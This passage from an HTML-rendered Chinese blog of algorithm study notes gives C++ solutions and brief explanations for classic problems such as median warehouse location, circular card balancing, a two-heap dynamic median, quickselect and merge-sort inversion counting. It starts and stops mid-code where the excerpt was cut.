class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">200010</span>;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> total = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> a[N];<br><span class="hljs-type">int</span> b[N];<br><span class="hljs-type">int</span> c[N];<br><span class="hljs-type">int</span> lan[<span class="hljs-number">3</span>*N];     <span class="hljs-comment">//3个语言来源</span><br><span class="hljs-type">int</span> dlan[<span class="hljs-number">3</span>*N];<br><span class="hljs-type">int</span> ans[<span class="hljs-number">3</span>*N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span>   <span class="hljs-comment">//lan -&gt; i</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> l = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> r = k;<br><span class="hljs-keyword">while</span> (r &gt; l)<br>&#123;<br><span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (dlan[mid] &gt;= x) r = mid;<br><span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> l;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>lan[total++] = a[i];<br>&#125;<br>cin &gt;&gt; m;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>&#123;<br>cin &gt;&gt; b[i];<br>lan[total++] = b[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>&#123;<br>cin &gt;&gt; c[i];<br>lan[total++] = c[i];<br>&#125;<br><span class="hljs-built_in">sort</span>(lan, lan + total);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; total; i++)    <span class="hljs-comment">//全部语言离散化</span><br>&#123;<br><span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || lan[i] != lan[i - <span class="hljs-number">1</span>])<br>&#123;<br>dlan[k++] = lan[i];<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)    <span class="hljs-comment">//记录离散化后的语言人数</span><br>&#123;<br>ans[<span class="hljs-built_in">find</span>(a[i])]++;<br>&#125;<br><br><span class="hljs-type">int</span> ansi = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> ansx = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ansy = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>&#123;<br><span class="hljs-type">int</span> ans1, ans2;<br>ans1 = ans[<span class="hljs-built_in">find</span>(b[i])];<br>ans2 = ans[<span class="hljs-built_in">find</span>(c[i])];<br><span class="hljs-keyword">if</span> (ans1 &gt; ansx || (ans1 == ansx &amp;&amp; ans2 &gt; ansy))<br>&#123;<br>ansi = i;<br>ansx = ans1;<br>ansy = ans2;<br>&#125;<br>&#125;<br>cout &lt;&lt; ansi &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="货仓选址">货仓选址</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> a[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>&#125;<br><span class="hljs-built_in">sort</span>(a, a + n);<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (i != n / <span class="hljs-number">2</span>)<br>&#123;<br>ans += <span class="hljs-built_in">abs</span>(a[i] - a[n / <span class="hljs-number">2</span>]);<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="七夕祭">七夕祭</h5><p>左右交换不影响行，上下交换不影响列</p><p>看成两个独立的环形均分纸牌问题</p><h6 id="均分纸牌问题">均分纸牌问题</h6><p>无环：</p><p>M个人，每人手上有C[1]~C[M]张纸牌，左右交换一张记1次，需要交换多少次，使每个人手上纸牌数相等。设纸牌总数为T。</p><p>A[i] = C[i] - T/M； 差多少张</p><p>S[i] 为A[i]的前缀和 （左右交换，次数抵消）， 交换次数为 Σ|s[i]|(i从1~M) ， 特别 ， S[M] = 0</p><p>环形：</p><p>一定存在一种最优解方案，至少有两个相邻的人不需要从对方那里获得纸牌</p><figure><img src="/2024/12/03/algorithm-enhance/1733232157819.png" alt="1733232157819"><figcaption aria-hidden="true">1733232157819</figcaption></figure><p>假设从k处断开。</p><p>A[k+1] s[k+1]-s[k]</p><p>A[k+2] s[k+2]-s[k]</p><p>... ...</p><p>A[M] s[M]-s[k]</p><p>A[1] s[1] + s[M]-s[k] = s[1] - s[k]</p><p>A[2] s[2] + s[M]-s[k] = s[2] - s[k]</p><p>...</p><p>A[k]</p><p>交换次数为Σ|s[i] - s[k]| (i从1~M) -&gt; 货仓选址问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">int</span> row[N];<br><span class="hljs-type">int</span> column[N];<br><span class="hljs-type">int</span> s1[N];<br><span class="hljs-type">int</span> s2[N];<br><span class="hljs-type">int</span> n, m, T;<br><span class="hljs-type">bool</span> flagrow, flagcol;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ansrow, anscol;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n &gt;&gt; m &gt;&gt; T;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; T; i++)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br>row[x]++;<br>column[y]++;<br>&#125;<br><span class="hljs-keyword">if</span> (T % n == <span class="hljs-number">0</span>)flagrow = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span> (T % m == <span class="hljs-number">0</span>)flagcol = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span> (flagrow)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>s1[i] = s1[i - <span class="hljs-number">1</span>] + row[i] - T / n;<br>&#125;<br><span class="hljs-built_in">sort</span>(s1 + <span class="hljs-number">1</span>, s1 + n + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (i != (n / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>))<br>ansrow += <span class="hljs-built_in">abs</span>(s1[i] - s1[(n / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>)]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flagcol)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>&#123;<br>s2[i] = s2[i - <span class="hljs-number">1</span>] + column[i] - T / m;<br>&#125;<br><span class="hljs-built_in">sort</span>(s2 + <span class="hljs-number">1</span>, s2 + m + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= m; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (i != (m / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>))<br>anscol += <span class="hljs-built_in">abs</span>(s2[i] - s2[(m / <span class="hljs-number">2</span> + <span class="hljs-number">1</span>)]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flagrow &amp;&amp; flagcol)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;both&quot;</span> &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; anscol + ansrow &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flagrow)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;row&quot;</span> &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; ansrow &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flagcol)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;column&quot;</span> &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; anscol &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;impossible&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="动态中位数">动态中位数</h5><p>对顶堆算法</p><h6 id="堆">堆</h6><p>优先队列，默认是大根堆</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++">priority_queue, 优先队列，默认是大根堆<br>    <span class="hljs-built_in">size</span>()<br>    <span class="hljs-built_in">empty</span>()<br>    <span class="hljs-built_in">push</span>()  插入一个元素<br>    <span class="hljs-built_in">top</span>()  返回堆顶元素<br>    <span class="hljs-built_in">pop</span>()  弹出堆顶元素<br>    <br>使用：<br>priority_queue&lt;<span class="hljs-type">int</span>&gt; heap;<br>定义成小根堆的方式：<br><span class="hljs-number">1.</span> 插入-x<br><span class="hljs-number">2.</span> priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; q;<br></code></pre></td></tr></table></figure><p>设总共有M个数，</p><p>偶数：前一半大顶堆，后一半小顶堆</p><p>奇数：多出来的一个放入小顶堆，堆顶作为中位数</p><p>每插入一个数，大于中位数的插入小顶堆，小于中位数的放于大顶堆，插入后检查上述性质，不符合进行调换即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>priority_queue&lt;<span class="hljs-type">int</span>&gt; big;<br>priority_queue&lt;<span class="hljs-type">int</span>, vector&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; small;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">int</span> a[N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>&#125;<br><span class="hljs-type">int</span> mid = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (a[i] &lt; mid)<br>big.<span class="hljs-built_in">push</span>(a[i]);<br><span class="hljs-keyword">else</span><br>small.<span class="hljs-built_in">push</span>(a[i]);   <span class="hljs-comment">//中位数所在地</span><br><span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)         <span class="hljs-comment">//奇数个元素，小顶堆元素多</span><br>&#123;<br><span class="hljs-keyword">if</span> (small.<span class="hljs-built_in">size</span>() &lt; big.<span class="hljs-built_in">size</span>() )<br>&#123;<br><span class="hljs-type">int</span> x = big.<span class="hljs-built_in">top</span>();<br>big.<span class="hljs-built_in">pop</span>();<br>small.<span class="hljs-built_in">push</span>(x);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>                   <span class="hljs-comment">//偶数个元素，两堆个数相等</span><br>&#123;<br><span class="hljs-keyword">if</span> (small.<span class="hljs-built_in">size</span>() &lt;  big.<span class="hljs-built_in">size</span>())   <span class="hljs-comment">//可省，好像不存在这种情况</span><br>&#123;<br><span class="hljs-type">int</span> x = big.<span class="hljs-built_in">top</span>();<br>big.<span class="hljs-built_in">pop</span>();<br>small.<span class="hljs-built_in">push</span>(x);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (small.<span class="hljs-built_in">size</span>() &gt; big.<span class="hljs-built_in">size</span>())<br>&#123;<br><span class="hljs-type">int</span> x = small.<span class="hljs-built_in">top</span>();<br>small.<span class="hljs-built_in">pop</span>();<br>big.<span class="hljs-built_in">push</span>(x);<br>&#125;<br>&#125;<br>mid = small.<span class="hljs-built_in">top</span>();<br><span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) cout &lt;&lt; mid &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="第k大数">第k大数</h4><p>快排的指针问题：</p><figure><img src="/2024/12/03/algorithm-enhance/1733232194001.png" alt="1733232194001"><figcaption aria-hidden="true">1733232194001</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">100010</span>;<br><span class="hljs-type">int</span> n,k;<br><span class="hljs-type">int</span> q[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r, <span class="hljs-type">int</span> k)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span> q[l];<br>    <span class="hljs-type">int</span> x = q[(l+r)/<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span> i = l - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> j = r + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i++;<span class="hljs-keyword">while</span>(q[i]&lt;x);    <span class="hljs-comment">//这里使用q[mid],mid=(l+r)/2会出现错误？</span><br>        <span class="hljs-keyword">do</span> j--;<span class="hljs-keyword">while</span>(q[j]&gt;x);<br>        <span class="hljs-keyword">if</span>(i&lt;j) <span class="hljs-built_in">swap</span>(q[i],q[j]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(j-l<span class="hljs-number">+1</span> &gt;= k) <span class="hljs-keyword">return</span> <span class="hljs-built_in">quick_sort</span>(l,j,k);  <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">quick_sort</span>(j<span class="hljs-number">+1</span>,r,k-(j-l<span class="hljs-number">+1</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin &gt;&gt; n &gt;&gt; k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&lt;=n; i++)<br>    &#123;<br>        cin &gt;&gt; q[i];<br>    &#125;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-built_in">quick_sort</span>(<span class="hljs-number">1</span>,n,k);<br>    cout &lt;&lt; ans &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="逆序对">逆序对</h4><h5 id="冒泡排序交换次数">冒泡排序交换次数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">500010</span>;<br><span class="hljs-type">int</span>  a[N];<br><span class="hljs-type">int</span> tmp[N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> k;<br><br><span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span>  <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (l == r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> mid = (l + r) / <span class="hljs-number">2</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> ans = <span class="hljs-built_in">merge_sort</span>(l, mid) + <span class="hljs-built_in">merge_sort</span>(mid + <span class="hljs-number">1</span>, r);<br><span class="hljs-type">int</span> i = l;<br><span class="hljs-type">int</span> j = mid + <span class="hljs-number">1</span>;<br>k = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>&#123;<br><span class="hljs-keyword">if</span> (a[i] &lt;= a[j]) tmp[k++] = a[i++];<br><span class="hljs-keyword">else</span><br>&#123;<br>tmp[k++] = a[j++]; ans += mid - i + <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = a[i++];<br><span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = a[j++];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i++) a[i] = tmp[j++];<br><span class="hljs-keyword">return</span> ans;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (cin &gt;&gt; n &amp;&amp; n)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>&#125;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span>  ans = <span class="hljs-built_in">merge_sort</span>(<span class="hljs-number">1</span>, n);<br>cout &lt;&lt; ans &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="nm数码可解性问题">n*m数码可解性问题</h5><p>奇数码：两个序列逆序对个数的奇偶性相同</p><p>偶数码：两个序列逆序对数之差和两个局面下空格所在行数之差的奇偶性相同</p><p>n*m：根据m的奇偶性讨论上述两种情况</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">250010</span>;<br><span class="hljs-type">int</span> q1[N];<br><span class="hljs-type">int</span> q2[N];<br><span class="hljs-type">int</span> tmp[N];<br><br><span class="hljs-function">LL <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span 